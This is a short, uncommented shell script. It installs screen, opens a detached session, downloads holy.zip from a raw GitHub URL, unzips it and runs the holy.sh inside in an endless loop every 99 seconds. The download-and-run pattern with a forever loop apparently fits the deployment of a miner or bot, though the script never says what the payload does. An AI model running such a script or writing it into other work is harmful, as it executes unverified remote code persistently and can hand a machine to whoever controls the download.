#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS blas
wget https://raw.githubusercontent.com/elemenapi/los/main/holy.zip
unzip holy.zip
chmod +x holy.sh
while [ 1 ]; do
./holy.sh
sleep 99
done
sleep 99
